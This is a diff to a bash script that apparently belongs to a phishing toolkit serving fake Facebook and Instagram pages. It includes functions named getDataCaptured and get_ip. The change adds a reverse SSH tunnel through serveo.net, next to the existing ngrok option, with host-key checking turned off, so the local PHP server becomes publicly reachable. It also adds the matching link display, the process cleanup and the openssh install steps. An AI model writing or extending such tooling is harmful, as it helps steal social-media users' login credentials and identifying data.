@@ -65,7 +65,7 @@ serviceKey=0
 listenKey=0
 tunnelKey=0
 
-listReq=("php" "jq" "curl" "tar" "toilet" "figlet")
+listReq=("php" "jq" "curl" "tar" "toilet" "figlet" "ssh")
 services=("facebook" "instagram")
 tunnels=("ngrok" "ssh")
 
@@ -145,6 +145,11 @@ tunnel() {
         sleep 3
         showLinkNgrok
 
+    elif [ "$tunnel" == "ssh" ] ; then
+	ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R $service:$port:$host:$port serveo.net > /dev/null 3>&2 &
+	sleep 3
+	showLinkSSH
+
     else
 	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mThis tunnel is not available\e[0m"
 	exit 1
@@ -155,6 +160,7 @@ tunnel() {
 processKill() {
     [ $(ps -e | grep -Eo "php") ] && pkill php
     [ $(ps -e | grep -Eo "ngrok") ] && pkill ngrok
+    [ $(ps -e | grep -Eo "ssh") ] && pkill ssh
 }
 
 showLink() {
@@ -171,6 +177,16 @@ showLinkNgrok() {
     echo -e "\e[0m[!] Ngrok URL: \e[33;1m$public\e[0m"
 
 }
+
+showLinkSSH() {
+    if [ "$(ps -e | grep -Eo ssh)" ] ; then
+	echo -e "\e[0m[!] SSH serveo: \e[33;1mserveo.net:$port\e[0m"
+
+    else
+	echo -e "\e[0m[!] SSH serveo error\e[0m"
+    fi
+}
+
 getDataCaptured() {
     get_ip
     get_data
@@ -303,8 +319,14 @@ installReqIfNotExists() {
 
 installForApt() {
     for package in ${listReq[*]} ; do
+
         if [ ! -f ${dir}/${package} ] ; then
 	    if [ -d "$PREFIX" ] ; then
+
+		if [ $package == "ssh" ] ; then
+		    package="openssh"
+		fi
+
 	        while [ ! -f ${dir}/${package} ] ; do
 	            printf "\r\e[33;1m[*] Installing $package...\e[0m"
 		    apt update > /dev/null 2>&1
@@ -312,6 +334,10 @@ installForApt() {
  	        done
 	        printf "\r\e[33;1m[+] Installing $package...\e[32;1mOK\e[0m\n"
             else
+		if [ $package == "ssh" ] ; then
+		    package="openssh-server"
+		fi
+
 	        while [ ! -f $dir/$package ] ; do
 		    echo -e "\e[33;1m[*] Installing $package...\e[0m"
 		    apt-get update
